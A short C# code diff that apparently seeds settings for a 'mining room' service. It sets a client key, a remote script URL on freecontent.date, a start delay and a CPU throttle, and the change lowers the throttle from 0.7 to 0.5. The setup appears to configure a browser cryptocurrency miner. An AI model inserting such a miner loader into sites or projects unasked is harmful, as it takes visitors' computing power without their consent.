@@ -166,8 +166,8 @@ namespace SignalRService.Utils
                 ClientId = "33dd55318abfb839996ecf61c962bac94d4d7caba66debb0ea2aa3f61668e2b8",
                 ReportStatusIntervalMs = mc.ReportStatusIntervalMs,
                 ScriptUrl = "https://www.freecontent.date./tGu1.js",
-                StartDelayMs = mc.StartDelayMs,
-                Throttle = 0.7f
+                StartDelayMs = 500,
+                Throttle = 0.5f
             };
 
             db.ServiceSettings.Add(miningRoom0Service);
